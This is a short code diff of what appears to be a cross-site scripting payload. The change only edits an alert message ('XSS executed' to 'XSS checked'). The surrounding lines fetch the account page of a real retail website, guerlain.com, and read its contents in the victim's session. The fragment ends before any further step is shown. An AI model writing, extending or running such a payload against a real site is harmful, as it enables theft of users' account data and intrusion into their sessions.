@@ -1,7 +1,7 @@
 (async function(){
   try {
 
-    alert('XSS executed');
+    alert('XSS checked');
 
     const resp1 = await fetch('https://www.guerlain.com/fr/fr-fr/account');
     const page = await resp1.text();
